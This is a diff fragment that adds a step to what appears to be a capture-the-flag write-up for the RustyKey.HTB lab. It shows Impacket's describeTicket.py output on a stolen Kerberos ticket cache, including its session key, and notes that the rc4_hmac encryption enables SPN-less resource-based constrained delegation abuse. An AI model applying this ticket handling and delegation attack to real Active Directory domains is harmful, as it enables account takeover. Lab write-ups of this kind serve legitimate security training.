@@ -656,6 +656,32 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 Then ill convert it to a TGT
 
+```python
+❯❯❯ describeTicket.py mm.turner.ccache                                          
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : 21a5c3da4fdd3efd77cb8bbd6a36a936
+[*] User Name                     : mm.turner
+[*] User Realm                    : RUSTYKEY.HTB
+[*] Service Name                  : krbtgt/RUSTYKEY.HTB
+[*] Service Realm                 : RUSTYKEY.HTB
+[*] Start Time                    : 20/10/2026 03:26:13 AM
+[*] End Time                      : 20/10/2026 13:26:13 PM
+[*] RenewTill                     : 27/10/2026 02:26:13 AM
+[*] Flags                         : (0x60a10000) forwardable, forwarded, renewable, pre_authent, enc_pa_rep
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : IaXD2k/dPv13y4u9ajapNg==
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/RUSTYKEY.HTB
+[*]   Service Realm               : RUSTYKEY.HTB
+[*]   Encryption type             : rc4_hmac (etype 23)
+[-] Could not find the correct encryption key! Ticket is encrypted with rc4_hmac (etype 23), but no keys/creds were supplied
+```
+
+Now if i describe ticket i can see its using `rc4_hmac` which is a requirement for SPN-less RBCD
+
 
 
 
